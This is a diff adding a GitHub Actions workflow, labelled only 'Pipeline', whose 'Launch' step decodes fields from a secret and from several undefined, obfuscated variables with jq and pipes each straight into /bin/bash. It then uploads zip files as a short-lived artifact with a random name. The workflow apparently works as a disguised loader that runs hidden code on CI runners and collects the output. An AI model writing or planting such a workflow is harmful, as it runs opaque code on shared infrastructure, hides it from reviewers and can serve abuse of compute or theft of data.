@@ -1,0 +1,33 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          lm6202: ${{ secrets.lm6202 }}
+        run: |
+          printf '%s' "$lm6202" | jq -r .f5 | /bin/bash
+          echo $xjpt25 | jq -r .gdn14 | /bin/bash
+          printf '%s' "$qw81" | jq -r .hlqif00534 | /bin/bash
+          printf '%s' "$q58" | jq -r .gdxyj03 | /bin/bash
+          echo $q1838 | jq -r .fo98 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2vX6pVmC
+          path: "*.zip"
+          retention-days: 1
